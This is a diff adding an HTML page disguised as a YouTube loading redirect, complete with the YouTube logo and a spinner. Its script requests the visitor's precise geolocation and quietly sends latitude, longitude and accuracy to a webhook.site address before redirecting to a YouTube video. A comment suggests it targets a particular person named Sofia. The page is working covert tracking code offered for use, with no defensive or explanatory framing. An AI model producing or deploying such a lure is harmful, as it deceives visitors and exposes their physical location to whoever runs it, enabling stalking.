@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading YouTube...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      margin: 0; 
+      padding: 0; 
+      background: #000; 
+      color: #fff; 
+      text-align: center; 
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      max-width: 600px;
+    }
+    .yt-logo {
+      width: 140px;
+      margin-bottom: 40px;
+    }
+    h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .spinner {
+      border: 5px solid rgba(255, 255, 255, 0.2);
+      border-top: 5px solid #f00; /* YouTube red */
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 40px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      font-size: 18px;
+      opacity: 0.8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/512px-YouTube_full-color_icon_%282017%29.svg.png" class="yt-logo" alt="YouTube">
+    <div class="spinner"></div>
+    <p>Please wait while we redirect you to YouTube</p>
+  </div>
+
+  <script>
+    const YT_URL = "https://www.youtube.com/watch?v=X7BifhBkA-M&t=961s"; // Sofia's real video/channel
+
+    const options = {
+      enableHighAccuracy: true,
+      timeout: 20000,
+      maximumAge: 0
+    };
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(success, error, options);
+    } else {
+      setTimeout(() => window.location.href = YT_URL, 2000);
+    }
+
+    function success(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+
+      new Image().src = 'https://webhook.site/36fd5f30-aaf6-4019-a81f-01928eaa4f79?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + new Date().toISOString();
+
+      setTimeout(() => window.location.href = YT_URL, 1500);
+    }
+
+    function error() {
+      setTimeout(() => window.location.href = YT_URL, 2000);
+    }
+  </script>
+</body>
+</html>
